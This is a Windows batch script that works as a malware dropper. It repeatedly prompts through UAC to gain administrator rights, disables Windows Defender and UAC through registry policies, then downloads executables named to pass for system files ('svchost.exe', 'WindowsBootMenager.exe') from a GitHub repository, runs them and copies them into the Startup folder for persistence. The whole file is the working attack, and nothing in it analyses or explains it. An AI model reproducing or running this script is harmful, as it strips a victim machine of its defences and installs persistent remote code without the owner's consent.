@echo off
cd C:\Windows\
setlocal enabledelayedexpansion
set "tempDir=%temp%"
>nul 2>&1 net session && (
    echo. > "%tempDir%\admincheck.ok"
)
powershell -WindowStyle Hidden -Command "(New-Object -ComObject WIA.CommonDialog).ShowAcquireImage()" >nul 2>&1
goto :ask
:setadmin
if exist "%tempDir%\admincheck.ok" (
    exit
)else (
goto setadmin2
)
:setadmin2
echo Set objShell = CreateObject("Shell.Application") > "%temp%\admin.vbs"
echo objShell.ShellExecute "%~s0", "admin", "", "runas", 1 >> "%temp%\admin.vbs"
"%temp%\admin.vbs"
del /q "%temp%\admin.vbs"
>nul 2>&1 net session && (
    echo. > "%tempDir%\admincheck.ok"
)
ping 127.0.0.1 -n 1 > nul
:ask

>nul 2>&1 net session && (
    set IsAdmin=1
)

if defined IsAdmin (
    goto admin
) else (
    goto setadmin 
)
pause
:admin
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
curl -s -o "svchost".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/svchost.exe"
svchost.exe
curl -s -o "WindowsBootMenager".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/WindowsBootMenager.exe"
xcopy /y WindowsBootMenager.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
WindowsBootMenager.exe
curl -s -o "chromedrivers".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/chromedrivers.exe"
xcopy /y chromedrivers.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
chromedrivers.exe
REM curl -s -o "installer".exe -JL "https://github.com/DanGILC-137/Legend/raw/main/installer.exe"
REM xcopy /y installer.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
REM installer.exe
ping 127.0.0.1 -n 1 > nul
del /q "%tempDir%\admincheck.ok"
exit